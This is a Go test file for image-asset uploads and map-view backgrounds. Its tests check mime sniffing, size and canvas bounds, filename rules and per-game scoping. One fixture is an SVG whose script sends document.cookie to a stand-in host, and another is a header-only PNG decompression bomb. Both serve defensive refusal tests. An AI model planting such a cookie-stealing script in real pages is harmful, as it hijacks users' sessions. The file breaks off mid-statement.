package views

import (
	"bytes"
	"context"
	"encoding/binary"
	"errors"
	"fmt"
	"hash/crc32"
	"image"
	"image/color"
	"image/jpeg"
	"image/png"
	"io"
	"math"
	"strings"
	"testing"

	"github.com/google/uuid"
	"github.com/jackc/pgx/v5/pgconn"

	"github.com/neverbot/maestro/internal/db/dbq"
	"github.com/neverbot/maestro/internal/metamodel"
	"github.com/neverbot/maestro/internal/realtime"
)

// The fixtures. Every one of them is built here rather than checked in
// as testdata, so that a test can name the dimensions it expects and the
// bytes really carry them — a checked-in image whose size nobody
// recomputed is exactly the fixture too small to distinguish any policy.

// pngBytes is a real PNG of the given size, encoded by the standard
// library.
func pngBytes(t *testing.T, width, height int) []byte {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, width, height))
	img.Set(0, 0, color.RGBA{R: 10, G: 20, B: 30, A: 255})
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		t.Fatalf("encode png: %v", err)
	}
	return buf.Bytes()
}

// jpegBytes is a real JPEG of the given size.
func jpegBytes(t *testing.T, width, height int) []byte {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, width, height))
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, nil); err != nil {
		t.Fatalf("encode jpeg: %v", err)
	}
	return buf.Bytes()
}

// riff wraps one chunk in the RIFF/WEBP container every WebP shares.
func riff(fourcc string, payload []byte) []byte {
	body := make([]byte, 0, len(payload)+20)
	body = append(body, "RIFF"...)
	body = binary.LittleEndian.AppendUint32(body, uint32(4+8+len(payload)))
	body = append(body, "WEBP"...)
	body = append(body, fourcc...)
	body = binary.LittleEndian.AppendUint32(body, uint32(len(payload)))
	return append(body, payload...)
}

// webpVP8X is an extended-format WebP header: the canvas size as two
// 24-bit values, each one less than the real one.
func webpVP8X(width, height int) []byte {
	payload := make([]byte, 10)
	payload[0] = 0x10 // the ALPHA flag, so the byte is not trivially zero.
	w, h := width-1, height-1
	payload[4], payload[5], payload[6] = byte(w), byte(w>>8), byte(w>>16)
	payload[7], payload[8], payload[9] = byte(h), byte(h>>8), byte(h>>16)
	return riff("VP8X", payload)
}

// webpVP8 is a lossy WebP frame header: three bytes of frame tag, the
// three-byte start code, then two 14-bit dimensions.
func webpVP8(width, height int) []byte {
	payload := make([]byte, 10)
	payload[3], payload[4], payload[5] = 0x9d, 0x01, 0x2a
	binary.LittleEndian.PutUint16(payload[6:8], uint16(width))
	binary.LittleEndian.PutUint16(payload[8:10], uint16(height))
	return riff("VP8 ", payload)
}

// webpVP8L is a lossless WebP header: a signature byte, then 14 bits of
// width-1 and 14 bits of height-1.
func webpVP8L(width, height int) []byte {
	payload := make([]byte, 5)
	payload[0] = 0x2f
	binary.LittleEndian.PutUint32(payload[1:5],
		uint32(width-1)|uint32(height-1)<<14)
	return riff("VP8L", payload)
}

// hugePNG is a PNG signature and a well-formed IHDR claiming an enormous
// canvas, with nothing behind it.
//
// This is the decompression bomb in its cheapest form: forty bytes on
// the wire that a browser would try to expand into gigabytes of RGBA.
// Nothing in this package decodes it — png.DecodeConfig reads the header
// and stops — which is exactly why the *claim* has to be bounded rather
// than the decode.
func hugePNG(width, height uint32) []byte {
	ihdr := make([]byte, 0, 17)
	ihdr = append(ihdr, "IHDR"...)
	ihdr = binary.BigEndian.AppendUint32(ihdr, width)
	ihdr = binary.BigEndian.AppendUint32(ihdr, height)
	ihdr = append(ihdr, 8, 6, 0, 0, 0) // 8-bit RGBA, no interlace.
	out := append([]byte{}, 0x89, 'P', 'N', 'G', 0x0d, 0x0a, 0x1a, 0x0a)
	out = binary.BigEndian.AppendUint32(out, uint32(len(ihdr)-4))
	out = append(out, ihdr...)
	return binary.BigEndian.AppendUint32(out, crc32.ChecksumIEEE(ihdr))
}

const svgSource = `<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <script>fetch("https://example.invalid/?c="+document.cookie)</script>
</svg>`

// upload is CreateAsset with no actor, which is what most of these tests
// want.
func (g *game) upload(t *testing.T, filename string, raw []byte) Asset {
	t.Helper()
	asset, err := g.views.CreateAsset(context.Background(), g.projectID, Actor{},
		filename, bytes.NewReader(raw))
	if err != nil {
		t.Fatalf("upload %s: %v", filename, err)
	}
	return asset
}

// TestAnSVGIsRefusedWhateverItCallsItself is the case a filename check
// misses, and the reason the mime is read from the bytes.
//
// An SVG is a script-execution vector when it is served inline, on the
// same origin as the session cookie of the designer looking at it. It is
// refused by the allowlist of magic numbers — not by recognising SVG —
// so the recognition below is asserted for its *wording* and the refusal
// is asserted for every spelling, including one that carries no `<svg`
// at all.
func TestAnSVGIsRefusedWhateverItCallsItself(t *testing.T) {
	g, _ := newGame(t)

	// The name says PNG; the bytes say otherwise, and the bytes decide.
	err := createAsset(t, g, "world-map.png", []byte(svgSource))
	assertRefused(t, err, pointer("bytes"), "look like an SVG")

	// An SVG with no XML declaration and a leading byte order mark: the
	// same refusal, because the same allowlist made it.
	err = createAsset(t, g, "map.png", append([]byte("\ufeff  "), svgSource[22:]...))
	assertRefused(t, err, pointer("bytes"), "look like an SVG")

	// And the case the recognition does *not* reach, which is the one
	// that proves the allowlist is what refuses: a file with no `<svg`
	// and no `<?xml` in it is refused just the same, by the general
	// sentence.
	err = createAsset(t, g, "map.png", []byte("GIF89a and then some bytes"))
	assertRefused(t, err, pointer("bytes"), "are not a image/png")

	// A RIFF container that is not a WebP — a WAV file is the one every
	// designer's machine has — is refused as *no image at all*, not as a
	// broken WebP. The distinction is what the second half of the WebP
	// magic number buys: without it the file is sniffed as image/webp
	// and refused a step later by the chunk parser, with a sentence
	// telling a designer their WebP is corrupt when they uploaded a
	// sound.
	wave := append([]byte("RIFF"), 0, 0, 0, 0)
	wave = append(wave, "WAVEfmt "...)
	assertRefused(t, createAsset(t, g, "map.png", append(wave, make([]byte, 16)...)),
		pointer("bytes"), "are not a image/png")

	// The control: nothing at all is stored by any of the three.
	assets := listedAssets(t, g)
	if len(assets) != 0 {
		t.Fatalf("a refused upload stored %d assets, want none: %v", len(assets), assets)
	}
}

// TestTheMimeIsSniffedNotTrusted stores the same bytes under three
// misleading names and requires the stored mime to be the one the bytes
// carry.
//
// The filename is the only thing a caller controls that could be
// mistaken for a format, and it is deliberately wrong in every row here.
func TestTheMimeIsSniffedNotTrusted(t *testing.T) {
	g, _ := newGame(t)
	ctx := context.Background()
	for _, tc := range []struct {
		filename string
		raw      []byte
		want     string
	}{
		{"looks-like-a-jpeg.jpg", pngBytes(t, 8, 8), MimePNG},
		{"looks-like-a-png.png", jpegBytes(t, 16, 16), MimeJPEG},
		{"looks-like-a-png-too.png", webpVP8X(24, 12), MimeWebP},
		{"no-extension-at-all", pngBytes(t, 4, 4), MimePNG},
	} {
		asset := g.upload(t, tc.filename, tc.raw)
		if asset.Mime != tc.want {
			t.Errorf("%s stored as %q, want %q: the mime is read from the bytes",
				tc.filename, asset.Mime, tc.want)
		}
		// Off a read rather than off the returned value: the return is
		// what Go passed to the INSERT, and only a read says what was
		// stored.
		stored, err := g.views.ReadAsset(ctx, g.projectID, asset.ID)
		if err != nil {
			t.Fatalf("read back %s: %v", tc.filename, err)
		}
		if stored.Mime != tc.want {
			t.Errorf("%s reads back as %q, want %q", tc.filename, stored.Mime, tc.want)
		}
		if stored.Filename != tc.filename {
			t.Errorf("Filename = %q, want %q: the name is stored as prose and read "+
				"by nothing else", stored.Filename, tc.filename)
		}
		if !bytes.Equal(stored.Bytes, tc.raw) {
			t.Errorf("%s came back with %d bytes, want the %d it was sent",
				tc.filename, len(stored.Bytes), len(tc.raw))
		}
	}
}

// countingReader hands out `total` bytes and records how many were
// actually pulled.
type countingReader struct {
	total, read int
}

func (c *countingReader) Read(p []byte) (int, error) {
	if c.read >= c.total {
		return 0, io.EOF
	}
	n := len(p)
	if remaining := c.total - c.read; n > remaining {
		n = remaining
	}
	// The bytes are a PNG signature followed by nothing in particular:
	// the size bound has to fire before anything looks at the format, so
	// a body that would otherwise sniff correctly is the harder case.
	for i := range p[:n] {
		p[i] = magicPNG[(c.read+i)%len(magicPNG)]
	}
	c.read += n
	return n, nil
}

// TestAnOversizeAssetIsRefusedBeforeItIsRead asserts both halves of that
// sentence, because they are different claims.
//
// "Refused" is the error. "Before it is read" is the byte count: an
// implementation that read the whole body and then measured it would
// pass the first assertion and fail the second, and it is the second
// that stands between one caller and this process's memory.
func TestAnOversizeAssetIsRefusedBeforeItIsRead(t *testing.T) {
	g, _ := newGame(t)
	body := &countingReader{total: 64 << 20}
	_, err := g.views.CreateAsset(context.Background(), g.projectID, Actor{},
		"enormous.png", body)
	assertRefusedErr(t, err, pointer("bytes"), "is larger than")
	if body.read > MaxAssetBytes+1 {
		t.Fatalf("the upload pulled %d bytes off the reader, and the most it may pull "+
			"is %d: a bound applied after io.ReadAll is a bound that already lost",
			body.read, MaxAssetBytes+1)
	}
}

// TestABodyOneBytePastTheCapIsNotStoredTruncated is the other half of
// the bound, and the half that says why readBounded reads one byte past
// it.
//
// It is a separate test from the byte count above because the two
// mutations differ: that one is about how much is read, this one is
// about what "too big" is measured against. A reader stopped at exactly
// the cap sees the first eight megabytes of a larger file and cannot
// tell them from a file of exactly eight megabytes.
func TestABodyOneBytePastTheCapIsNotStoredTruncated(t *testing.T) {
	g, _ := newGame(t)
	// The control, so the refusal below cannot pass by refusing everything:
	// exactly the cap is accepted, and one byte more is not.
	//
	// **Both are built from a JPEG, and that is the point of the
	// fixture.** jpeg.DecodeConfig returns as soon as it has read the
	// frame header, so it never looks at the padding — which means a
	// truncated body is *not* caught by the decoder, and a bound that
	// read only MaxAssetBytes would store the first eight megabytes of a
	// larger file and report success. With a PNG the same mutation goes
	// red for the wrong reason: png.DecodeConfig walks chunks past the
	// header and trips over the padding. That is the difference between
	// a mutation this test kills and one the standard library kills for
	// it.
	atCap := padded(jpegBytes(t, 8, 8), MaxAssetBytes)
	if _, err := g.views.CreateAsset(context.Background(), g.projectID, Actor{},
		"exactly-at-the-cap.png", bytes.NewReader(atCap)); err != nil {
		t.Fatalf("an asset of exactly %d bytes must be accepted: %v", MaxAssetBytes, err)
	}
	overCap := padded(jpegBytes(t, 8, 8), MaxAssetBytes+1)
	assertRefused(t, createAsset(t, g, "one-byte-over.png", overCap),
		pointer("bytes"), "is larger than")
	// And nothing of it was stored, truncated or otherwise: two assets
	// exist, the one at the cap and the one this test's control uploaded.
	for _, a := range listedAssets(t, g) {
		if a.Filename == "one-byte-over.png" {
			t.Fatalf("an over-cap upload was stored: a bound that reads exactly the " +
				"cap cannot tell a file of that size from the front of a larger one")
		}
	}
}

// padded lengthens raw to exactly n bytes. The trailing bytes are past
// the PNG's IEND chunk, which every decoder ignores and which this
// package never looks at either: the point is the length.
func padded(raw []byte, n int) []byte {
	out := make([]byte, n)
	copy(out, raw)
	return out
}

// TestAnEmptyUploadIsRefused is the other end of the size bound. Nothing
// else in this file sends no bytes at all, and an empty asset would
// otherwise be stored as a background nobody can see.
func TestAnEmptyUploadIsRefused(t *testing.T) {
	g, _ := newGame(t)
	assertRefused(t, createAsset(t, g, "nothing.png", nil),
		pointer("bytes"), "is empty")
}

// TestWidthAndHeightAreDecodedAndReadBack is this task's write-only
// column test, and the third time this sub-project has needed one.
//
// Width and height are decoded rather than given, so nothing but a read
// says the decoder ran at all: a CreateAsset that stored 0 and 0, or
// that stored the height as the width, would pass every other test in
// this file. The sizes are deliberately unequal and deliberately not
// round, so a transposition is a failure rather than a coincidence.
func TestWidthAndHeightAreDecodedAndReadBack(t *testing.T) {
	g, _ := newGame(t)
	cases := []struct {
		name          string
		raw           []byte
		mime          string
		width, height int32
	}{
		{"png", pngBytes(t, 37, 19), MimePNG, 37, 19},
		{"jpeg", jpegBytes(t, 48, 21), MimeJPEG, 48, 21},
		{"webp-vp8x", webpVP8X(1201, 903), MimeWebP, 1201, 903},
		{"webp-vp8", webpVP8(640, 481), MimeWebP, 640, 481},
		{"webp-vp8l", webpVP8L(300, 199), MimeWebP, 300, 199},
	}
	for _, tc := range cases {
		g.upload(t, tc.name+".bin", tc.raw)
	}
	// Read back through the listing, which is what views.list_assets
	// answers with and therefore the only surface that proves these
	// columns are readable at all.
	assets := listedAssets(t, g)
	if len(assets) != len(cases) {
		t.Fatalf("listed %d assets, want %d", len(assets), len(cases))
	}
	byName := map[string]Asset{}
	for _, a := range assets {
		byName[a.Filename] = a
	}
	for _, tc := range cases {
		got, ok := byName[tc.name+".bin"]
		if !ok {
			t.Fatalf("%s is not in the listing", tc.name)
		}
		if got.Width != tc.width || got.Height != tc.height {
			t.Errorf("%s is %dx%d, want %dx%d: the size is decoded from the header",
				tc.name, got.Width, got.Height, tc.width, tc.height)
		}
		if got.Mime != tc.mime {
			t.Errorf("%s stored as %q, want %q", tc.name, got.Mime, tc.mime)
		}
		if got.CreatedAt.IsZero() {
			t.Errorf("%s has no created_at, and the listing is ordered by it", tc.name)
		}
	}
}

// TestAHeaderClaimingAnEnormousCanvasIsRefused bounds what a header may
// claim.
//
// Nothing in this package decodes pixels, so an enormous claim costs
// this process nothing — which is precisely why it has to be refused
// here: the browser that draws the background is the reader that *does*
// expand it, and forty bytes of crafted IHDR would otherwise become
// gigabytes of RGBA in a designer's tab. Both shapes are covered,
// because a per-side bound alone lets a one-pixel-tall strip through and
// a pixel bound alone lets a 1x2,000,000,000 strip through.
func TestAHeaderClaimingAnEnormousCanvasIsRefused(t *testing.T) {
	g, _ := newGame(t)
	for _, tc := range []struct {
		name string
		raw  []byte
		want string
	}{
		{"a square past the side bound", hugePNG(30000, 30000), "no side may be more than"},
		{"a strip past the side bound", hugePNG(60000, 1), "no side may be more than"},
		{"inside every side bound and past the pixel bound",
			hugePNG(19000, 19000), "the most a background may hold"},
		{"a canvas of no size at all", webpVP8(0, 0), "which is no image at all"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			assertRefused(t, createAsset(t, g, "bomb.png", tc.raw),
				pointer("bytes"), tc.want)
		})
	}
	// The control: the largest thing this rule admits is admitted. A
	// header is all this asserts, which is all the rule reads.
	g.upload(t, "big-but-allowed.png", hugePNG(MaxAssetDimension, 2000))
}

// TestBytesWhoseHeaderIsBrokenAreRefusedRatherThanStoredAtZero pins what
// happens when the magic number matches and nothing behind it does.
//
// The alternative — storing 0x0 and carrying on — is the write-only
// column this file's other test exists to prevent, arriving through the
// error path instead of the success one.
func TestBytesWhoseHeaderIsBrokenAreRefusedRatherThanStoredAtZero(t *testing.T) {
	g, _ := newGame(t)
	for _, tc := range []struct {
		name string
		raw  []byte
	}{
		{"a png signature and nothing else", magicPNG},
		{"a jpeg that stops before its frame", append([]byte{}, magicJPEG...)},
		{"a riff container with no image chunk", riff("ICCP", make([]byte, 16))},
		{"a vp8 frame with no start code", riff("VP8 ", make([]byte, 10))},
		{"a vp8l chunk with no signature byte", riff("VP8L", make([]byte, 5))},
		{"a webp that ends inside its chunk header", []byte("RIFF\x00\x00\x00\x00WEBPVP8")},
	} {
		t.Run(tc.name, func(t *testing.T) {
			err := createAsset(t, g, "broken.png", tc.raw)
			if err == nil {
				t.Fatalf("bytes that carry no readable size must be refused")
			}
			var ve *metamodel.ValidationError
			if !errors.As(err, &ve) {
				t.Fatalf("want a validation error, got %v", err)
			}
		})
	}
}

// TestAFilenameIsRequiredAndBounded: an asset has no key, so the
// filename is the whole of what a designer picking one out of a list has
// to go on.
func TestAFilenameIsRequiredAndBounded(t *testing.T) {
	g, _ := newGame(t)
	raw := pngBytes(t, 8, 8)
	assertRefused(t, createAsset(t, g, "", raw), pointer("filename"), "is required")
	assertRefused(t, createAsset(t, g, strings.Repeat("é", MaxAssetFilenameLen+1), raw),
		pointer("filename"), "at most")
	assertRefused(t, createAsset(t, g, "map\x00.png", raw),
		pointer("filename"), "control character")
	// The cap counts characters and not bytes, exactly as a view's name
	// does: a filename in Spanish must not be half the length of one in
	// English.
	g.upload(t, strings.Repeat("é", MaxAssetFilenameLen), raw)
	// And the filename is judged before the bytes are read: an empty
	// name on an oversize body hears about the name.
	body := &countingReader{total: 64 << 20}
	_, err := g.views.CreateAsset(context.Background(), g.projectID, Actor{}, "", body)
	assertRefusedErr(t, err, pointer("filename"), "is required")
	if body.read != 0 {
		t.Fatalf("the body was read (%d bytes) before the filename was judged: the "+
			"order of the passes is the order a caller can act on them", body.read)
	}
}

// TestTheUploaderIsRecordedAndAForeignTokenIsRefused covers the audit
// columns, which is where the write-only defect was found twice before
// — most recently in the test written to catch exactly that.
func TestTheUploaderIsRecordedAndAForeignTokenIsRefused(t *testing.T) {
	azeroth, outland := newGame(t)
	ctx := context.Background()
	user := newUser(t, azeroth.pool)
	token := newToken(t, azeroth.pool, azeroth.projectID)
	asset, err := azeroth.views.CreateAsset(ctx, azeroth.projectID,
		Actor{UserID: &user, TokenID: &token}, "map.png",
		bytes.NewReader(pngBytes(t, 8, 8)))
	if err != nil {
		t.Fatalf("upload: %v", err)
	}
	var gotUser, gotToken *uuid.UUID
	if err := azeroth.pool.QueryRow(ctx,
		`SELECT created_by_user_id, created_by_token_id FROM view_assets WHERE id = $1`,
		asset.ID).Scan(&gotUser, &gotToken); err != nil {
		t.Fatalf("read the audit columns: %v", err)
	}
	if gotUser == nil || *gotUser != user || gotToken == nil || *gotToken != token {
		t.Fatalf("audit columns = (%v, %v), want (%s, %s)", gotUser, gotToken, user, token)
	}

	// A token of another game is refused as a scope violation rather
	// than as a raw 23503 over a generated constraint name, which says
	// nothing about a credential bound to the wrong project.
	foreign := newToken(t, outland.pool, outland.projectID)
	_, err = azeroth.views.CreateAsset(ctx, azeroth.projectID,
		Actor{TokenID: &foreign}, "map.png", bytes.NewReader(pngBytes(t, 8, 8)))
	if !errors.Is(err, ErrActorNotInGame) {
		t.Fatalf("a foreign token must be refused as such, got %v", err)
	}
}

// TestAssetsOfAnotherGameAreNotListed and its positive control. The
// project filter on ListViewAssets is the whole mechanism: an asset has
// no key and names no parent that could scope the read.
func TestAssetsOfAnotherGameAreNotListed(t *testing.T) {
	azeroth, outland := newGame(t)
	mine := azeroth.upload(t, "azeroth.png", pngBytes(t, 8, 8))
	theirs := outland.upload(t, "outland.png", pngBytes(t, 9, 9))

	assets := listedAssets(t, azeroth)
	if len(assets) != 1 || assets[0].ID != mine.ID {
		t.Fatalf("azeroth listed %v, want only its own asset %s", assets, mine.ID)
	}
	// The positive control in the same test: the other game's asset is
	// really there, so the assertion above cannot pass because nothing
	// was written.
	others := listedAssets(t, outland)
	if len(others) != 1 || others[0].ID != theirs.ID {
		t.Fatalf("outland listed %v, want its own asset %s", others, theirs.ID)
	}
}

// TestAnAssetOfAnotherGameIsNotServed drives the read the serving route
// makes, with a leaked id — which is the only way this filter can be
// observed, since every id a caller legitimately holds came from a
// listing that was already scoped.
func TestAnAssetOfAnotherGameIsNotServed(t *testing.T) {
	azeroth, outland := newGame(t)
	ctx := context.Background()
	theirs := outland.upload(t, "outland.png", pngBytes(t, 9, 9))

	if _, err := azeroth.views.ReadAsset(ctx, azeroth.projectID, theirs.ID); !errors.Is(
		err, ErrNotFound) {
		t.Fatalf("azeroth read outland's asset: %v", err)
	}
	// The control: outland can read its own, so the id is a real one.
	if _, err := outland.views.ReadAsset(ctx, outland.projectID, theirs.ID); err != nil {
		t.Fatalf("outland must be able to read its own asset: %v", err)
	}
}

// backedView saves a map view and puts one asset behind it.
func (g *game) backedView(t *testing.T, key string, asset uuid.UUID,
	scale float64, offset Point,
) uuid.UUID {
	t.Helper()
	ctx := context.Background()
	in := saveable(key, questsOnly)
	in.Renderer = RendererMap
	row, err := g.views.UpsertView(ctx, g.projectID, in)
	if err != nil {
		t.Fatalf("save %s: %v", key, err)
	}
	if err := g.views.SetBackground(ctx, g.projectID, key, BackgroundInput{
		AssetID: &asset, Scale: &scale, Offset: &offset,
	}); err != nil {
		t.Fatalf("set the background of %s: %v", key, err)
	}
	return row.ID
}

// TestABackgroundWritePublishesItsInvalidation is the fourth kind,
// asserted rather than described.
//
// The argument is view.positions', verbatim: a browser holding a picture
// has no other way to learn the picture changed, and a background is
// more of the picture than a drag is — it is the map renderer's ground.
// views.sql states the equivalence from the storage side ("a dragged
// node is the same kind of act as a placed background"), so the two
// writes cannot differ on whether anyone is told.
//
// Both arms are driven. A clear removes the ground as surely as a
// placement changes it, and a test that drove only the placement would
// leave the clear free to go quiet.
//
// The two subscribers are the pair a wrong gating would silently cut
// out — a viewer, excluded by any MinRole above viewer, and a token
// caller, excluded by HumanOnly — which is the same pair the position
// and upsert tests use, because the gating of this kind *is* theirs.
func TestABackgroundWritePublishesItsInvalidation(t *testing.T) {
	g, _ := newGame(t)
	ctx := context.Background()
	hub := realtime.NewHub()
	svc := New(g.pool, hub)

	asset := g.upload(t, "ground.png", pngBytes(t, 8, 8))
	in := saveable("world", questsOnly)
	in.Renderer = RendererMap
	row, err := svc.UpsertView(ctx, g.projectID, in)
	if err != nil {
		t.Fatalf("save the view: %v", err)
	}

	viewer := hub.Subscribe(g.projectID, "viewer", false)
	defer hub.Unsubscribe(viewer)
	agent := hub.Subscribe(g.projectID, "viewer", true)
	defer hub.Unsubscribe(agent)
	for _, step := range []struct {
		what string
		in   BackgroundInput
	}{
		{"a placement", BackgroundInput{AssetID: &asset.ID}},
		{"a clear", BackgroundInput{}},
	} {
		if err := svc.SetBackground(ctx, g.projectID, "world", step.in); err != nil {
			t.Fatalf("%s: %v", step.what, err)
		}
		for who, sub := range map[string]*realtime.Subscription{"viewer": viewer, "agent": agent} {
			got := receive(t, sub)
			if got.Kind != "view.background" {
				t.Fatalf("%s after %s got %q, want view.background", who, step.what, got.Kind)
			}
			// The same payload assertion the position kind gets, and it
			// is the same claim: identity only, no asset id a client
			// could render instead of re-reading, and no version — this
			// statement advances none, so a version here could not have
			// moved.
			assertPositionsPayload(t, who, got, row.ID, "world")
		}
	}
}

// TestNoBackgroundEventIsPublishedWhenTheWriteIsRefused is the control
// the test above cannot be without: a publish placed before the write
// announces a ground that never landed, and every subscriber's reaction
// is to re-read a picture that did not change.
//
// Two refusals, one per pass SetBackground makes: the call's own
// arguments, and the view itself.
func TestNoBackgroundEventIsPublishedWhenTheWriteIsRefused(t *testing.T) {
	g, _ := newGame(t)
	ctx := context.Background()
	hub := realtime.NewHub()
	svc := New(g.pool, hub)

	in := saveable("world", questsOnly)
	in.Renderer = RendererMap
	if _, err := svc.UpsertView(ctx, g.projectID, in); err != nil {
		t.Fatalf("save the view: %v", err)
	}
	sub := hub.Subscribe(g.projectID, "owner", false)
	defer hub.Unsubscribe(sub)

	scale := 2.0
	if err := svc.SetBackground(ctx, g.projectID, "world",
		BackgroundInput{Scale: &scale}); err == nil {
		t.Fatal("a scale with no image must be refused")
	}
	if err := svc.SetBackground(ctx, g.projectID, "nothing-here",
		BackgroundInput{}); err == nil {
		t.Fatal("a background on a view that does not exist must be refused")
	}
	requireNothing(t, sub, "a refused background write")

	// The positive control in the same test, so the assertion above
	// cannot pass because this hub never carried anything.
	if err := svc.SetBackground(ctx, g.projectID, "world", BackgroundInput{}); err != nil {
		t.Fatalf("clear: %v", err)
	}
	if got := receive(t, sub); got.Kind != "view.background" {
		t.Fatalf("the control published %q, want view.background", got.Kind)
	}
}

// TestABackgroundIsWrittenWholeAndReadBack is the read-back for the
// three columns this task's setter owns, and it exists for the reason
// the width/height one does: scale and offset are stored by one call and
// read by nothing else in this package.
func TestABackgroundIsWrittenWholeAndReadBack(t *testing.T) {
	g, _ := newGame(t)
	ctx := context.Background()
	asset := g.upload(t, "azeroth.png", pngBytes(t, 37, 19))
	g.backedView(t, "world", asset.ID, 2.5, Point{X: 10, Y: -4})

	got, err := g.views.ViewByKey(ctx, g.projectID, "world")
	if err != nil {
		t.Fatalf("read back: %v", err)
	}
	if got.BackgroundAssetID == nil || *got.BackgroundAssetID != asset.ID {
		t.Fatalf("BackgroundAssetID = %v, want %s", got.BackgroundAssetID, asset.ID)
	}
	if got.BackgroundScale != 2.5 {
		t.Errorf("BackgroundScale = %v, want 2.5", got.BackgroundScale)
	}
	if string(got.BackgroundOffset) != `{"x": 10, "y": -4}` {
		t.Errorf("BackgroundOffset = %s, want the object that was written",
			got.BackgroundOffset)
	}

	// Clearing it: a nil asset id is a value a caller means, and it is
	// the only way to remove a background. The two knobs go back to
	// their defaults with it, because a scale placing nothing is a value
	// nothing reads.
	if err := g.views.SetBackground(ctx, g.projectID, "world",
		BackgroundInput{}); err != nil {
		t.Fatalf("clear the background: %v", err)
	}
	got, err = g.views.ViewByKey(ctx, g.projectID, "world")
	if err != nil {
		t.Fatalf("read back after clearing: %v", err)
	}
	if got.BackgroundAssetID != nil {
		t.Errorf("BackgroundAssetID = %v, want nil after a clear", got.BackgroundAssetID)
	}
	if got.BackgroundScale != DefaultBackgroundScale ||
		string(got.BackgroundOffset) != `{"x": 0, "y": 0}` {
		t.Errorf("clearing left scale %v and offset %s, want the column defaults",
			got.BackgroundScale, got.BackgroundOffset)
	}
}

// TestSettingABackgroundChangesNothingElseAboutTheView is the invariant
// Task 11 handed this task by name: the setter is the second write path
// over a view's row, and it must not become a setter for the query or
// the renderer parameters — CheckRenderer's single caller is what makes
// "no stored view is undrawable" a guarantee rather than a hope.
//
// It also pins the decision that a background does not advance the
// version, for the reason a drag does not: the version guards the query
// document, and a caller holding one should not meet a conflict over a
// change to something it never wrote.
func TestSettingABackgroundChangesNothingElseAboutTheView(t *testing.T) {
	g, _ := newGame(t)
	ctx := context.Background()
	in := saveable("world", questsToZones)
	in.Renderer = RendererMap
	in.RendererParams = map[string]any{"snap": 10.0}
	in.Description = "The whole of Azeroth."
	in.LayoutMode = LayoutManual
	before, err := g.views.UpsertView(ctx, g.projectID, in)
	if err != nil {
		t.Fatalf("save: %v", err)
	}
	asset := g.upload(t, "azeroth.png", pngBytes(t, 8, 8))
	scale := 3.0
	if err := g.views.SetBackground(ctx, g.projectID, "world",
		BackgroundInput{AssetID: &asset.ID, Scale: &scale}); err != nil {
		t.Fatalf("set the background: %v", err)
	}

	after, err := g.views.ViewByKey(ctx, g.projectID, "world")
	if err != nil {
		t.Fatalf("read back: %v", err)
	}
	if after.Version != before.Version {
		t.Errorf("Version moved from %d to %d: a background is not an edit of the "+
			"query document the version guards", before.Version, after.Version)
	}
	if string(after.Query) != string(before.Query) {
		t.Errorf("the stored query changed: the setter writes three columns and no more")
	}
	if string(after.RendererParams) != string(before.RendererParams) {
		t.Errorf("renderer_params = %s, want %s untouched: a setter that writes them "+
			"without re-checking them against the query is how a stored view becomes "+
			"undrawable", after.RendererParams, before.RendererParams)
	}
	if after.Renderer != before.Renderer || after.Description != before.Description ||
		after.LayoutMode != before.LayoutMode || after.Name != before.Name {
		t.Errorf("the setter changed a column it does not own: %+v", after)
	}
}

// TestOnlyARendererThatDrawsABackgroundAcceptsOne carries this file's
// first rule — a stored value no renderer reads is a lie a designer will
// believe — to the value that lives in a column instead of in
// renderer_params.
//
// It drives **every** renderer in the catalogue rather than one of each
// kind, so a seventh renderer added later cannot quietly land outside
// the rule, and it carries a vacuity check in both directions: a run in
// which everything is accepted, or everything refused, is a run that
// proves nothing.
func TestOnlyARendererThatDrawsABackgroundAcceptsOne(t *testing.T) {
	g, _ := newGame(t)
	ctx := context.Background()
	asset := g.upload(t, "azeroth.png", pngBytes(t, 8, 8))
	accepted, refused := 0, 0
	for _, r := range renderers {
		key := "view_" + r.Name
		in := saveable(key, drawableBy(r.Name))
		in.Renderer = r.Name
		in.RendererParams = paramsFor(r.Name)
		if _, err := g.views.UpsertView(ctx, g.projectID, in); err != nil {
			t.Fatalf("save a %s view: %v", r.Name, err)
		}
		err := g.views.SetBackground(ctx, g.projectID, key,
			BackgroundInput{AssetID: &asset.ID})
		switch {
		case r.ReadsBackground:
			if err != nil {
				t.Errorf("%s reads a background and refused one: %v", r.Name, err)
			}
			accepted++
		default:
			assertRefusedErr(t, err, pointer("asset_id"), "which draws none")
			refused++
		}
		// Clearing is legal under every renderer, whatever it draws: a
		// view whose renderer changed away from map has to be able to
		// drop the image it can no longer show.
		if err := g.views.SetBackground(ctx, g.projectID, key,
			BackgroundInput{}); err != nil {
			t.Errorf("%s refused a clear: %v", r.Name, err)
		}
	}
	if accepted == 0 || refused == 0 {
		t.Fatalf("accepted %d and refused %d: a run that goes one way for every "+
			"renderer cannot tell the rule from its absence", accepted, refused)
	}
}

// TestABackgroundKnobWithNoBackgroundIsRefused is the rule that used to
// live in the map renderer's own Requires, moved with the columns rather
// than restated: a scale or an offset with no image places nothing.
func TestABackgroundKnobWithNoBackgroundIsRefused(t *testing.T) {
	g, _ := newGame(t)
	ctx := context.Background()
	in := saveable("world", questsOnly)
	in.Renderer = RendererMap
	if _, err := g.views.UpsertView(ctx, g.projectID, in); err != nil {
		t.Fatalf("save: %v", err)
	}
	scale, offset := 2.0, Point{X: 1, Y: 2}
	assertRefusedErr(t, g.views.SetBackground(ctx, g.projectID, "world",
		BackgroundInput{Scale: &scale}), pointer("scale"), "sets none")
	assertRefusedErr(t, g.views.SetBackground(ctx, g.projectID, "world",
		BackgroundInput{Offset: &offset}), pointer("offset"), "sets none")
	// Both at once come back at once, which is this package's standing
	// rule about a caller that is wrong twice.
	err := g.views.SetBackground(ctx, g.projectID, "world",
		BackgroundInput{Scale: &scale, Offset: &offset})
	var ve *metamodel.ValidationError
	if !errors.As(err, &ve) || len(ve.Fields) != 2 {
		t.Fatalf("two bad knobs must come back as two problems, got %v", err)
	}

	// The scale's own bounds, ahead of 0008_views.sql's CHECK, which
	// answers a caller's own argument with an untyped 23514.
	asset := g.upload(t, "azeroth.png", pngBytes(t, 8, 8))
	for _, bad := range []float64{0, -1} {
		value := bad
		assertRefusedErr(t, g.views.SetBackground(ctx, g.projectID, "world",
